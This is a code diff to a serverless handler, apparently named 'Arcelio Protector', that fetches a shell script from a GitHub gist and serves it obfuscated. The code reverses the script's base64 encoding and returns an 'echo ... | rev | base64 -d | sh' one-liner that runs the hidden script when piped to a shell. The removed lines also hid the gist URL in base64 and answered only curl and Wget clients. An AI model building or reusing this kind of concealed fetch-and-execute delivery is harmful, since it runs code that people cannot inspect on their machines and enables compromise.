@@ -1,19 +1,16 @@
-// Arcelio Protector - Vercel Final Deployment
-export default async function handler(a, b) {
-    const _0x1 = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9WYW5uWEQwL2U3YmEzNGYxZDY0MWQ0MGYyMDlmYzBiZjg5OWJjNjZmL3Jhdy9hNjIzNzk5ZjkwZGU5MTIwZDkwNGNiNWNlNmYwZGNhOWVmMDkwOTM0L0FyYy5zaA==";
-    const _0x2 = atob(_0x1);
+export default async function handler(req, res) {
+  const GIST_URL = "https://gist.githubusercontent.com/VannXD0/e7ba34f1d641d40f209fc0bf899bc6ff/raw/a623799f90de9120d904cb5ce6f0dca9ef090934/Arc.sh";
+  
+  try {
+    const response = await fetch(GIST_URL);
+    if (!response.ok) return res.status(404).send("echo 'Gist Not Found'");
     
-    try {
-        const _0x3 = a.headers['user-agent'] || "";
-        if (!_0x3.includes("curl") && !_0x3.includes("Wget")) return b.status(403).send("403 Forbidden");
-
-        const _0x4 = await fetch(_0x2);
-        const _0x5 = await _0x4.text();
-        const _0x6 = Buffer.from(_0x5).toString('base64').split('').reverse().join('');
-        
-        b.setHeader("Content-Type", "text/plain");
-        return b.status(200).send(`echo "${_0x6}" | rev | base64 -d | sh`);
-    } catch (_0x7) {
-        return b.status(500).send("echo 'Err'");
-    }
+    const script = await response.text();
+    const payload = Buffer.from(script).toString('base64').split('').reverse().join('');
+    
+    res.setHeader("Content-Type", "text/plain");
+    return res.status(200).send(`echo "${payload}" | rev | base64 -d | sh`);
+  } catch (e) {
+    return res.status(500).send("echo 'Server Error'");
+  }
 }
